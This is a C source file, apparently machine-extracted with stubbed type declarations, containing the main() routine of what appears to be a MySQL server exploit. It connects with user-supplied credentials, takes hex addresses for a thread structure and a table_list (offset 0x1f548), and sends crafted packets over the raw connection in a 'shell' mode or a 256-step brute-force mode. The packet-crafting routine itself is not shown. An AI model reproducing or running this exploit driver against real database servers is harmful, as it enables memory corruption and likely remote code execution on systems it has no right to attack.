
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_8__ TYPE_2__ ;
typedef struct TYPE_7__ TYPE_1__ ;


struct TYPE_7__ {int fd; } ;
struct TYPE_8__ {TYPE_1__ net; } ;


 int atoi (scalar_t__) ;
 int c ;
 TYPE_2__* conn ;
 int d ;
 int exit (int ) ;
 int fd ;
 int fprintf (int ,char*,char*) ;
 int getopt (int,char**,char*) ;
 int hexdump ;
 int mysql_close (TYPE_2__*) ;
 char* mysql_error (TYPE_2__*) ;
 TYPE_2__* mysql_init (int *) ;
 int mysql_real_connect (TYPE_2__*,char*,char*,char*,int *,int ,char*,int ) ;
 scalar_t__ optarg ;
 scalar_t__ opterr ;
 int printf (char*,int,int) ;
 int sendit (char*,int,int) ;
 int stderr ;
 char* strdup (char*) ;
 scalar_t__ strtol (scalar_t__,int *,int) ;
 int tbl ;
 int thd ;
 int usage () ;

int
main (int argc, char *argv[])
{

  int fdest = 0;
  int port = 3306;
  int shell = 1;
  int force_table = 0;
  char buf1[65535];
  char *socket;
  char *user = ((void*)0);
  char *pass = ((void*)0);
  char *host = ((void*)0);
  socket = strdup ("/tmp/mysql2.sock");
  opterr = 0;

  while ((c = getopt (argc, argv, "s:t:a:P:Hh:u:p:ix")) != -1)
    switch (c)
      {
      case 's':
 socket = (char *) optarg;
 break;
      case 't':
 force_table = 1;
 tbl = (int) strtol (optarg, ((void*)0), 16);

 break;
      case 'a':
 thd = (int) strtol (optarg, ((void*)0), 16);
 break;
      case 'u':
 user = (char *) optarg;
 break;
      case 'p':
 pass = (char *) optarg;
 break;
      case 'P':
 port = atoi (optarg);
 break;
      case 'h':
 host = (char *) optarg;
 break;
      case 'i':
 shell = 0;
 break;
      case 'x':
 hexdump = 1;
 break;
      case 'H':
 usage ();
 return 1;
      default:
 break;
      }

  if (!force_table)
    tbl = thd + 0x1f548;
  conn = mysql_init (((void*)0));
  int ret = mysql_real_connect (conn,
    host,
    user,
    pass,
    ((void*)0),
    0,
    socket,
    0);

  if (!ret)
    {
      fprintf (stderr, "Can't connect, error : %s\n", mysql_error (conn));
      return 1;
    }
  printf ("using table_list:%x  thread:%x\n", tbl, thd);

  fd = conn->net.fd;

  if (shell)
    {
      d = 2;
      sendit (buf1, fdest, -1);
      d = 3;
      sendit (buf1, fdest, -1);
      d = 3;
      sendit (buf1, fdest, -1);
    }
  else
    {
      int l;
      d = 3;
      for (l = 0; l < 256; l++)
 {
   sendit (buf1, fdest, l);
 }
    }
  mysql_close (conn);

  exit (0);
}
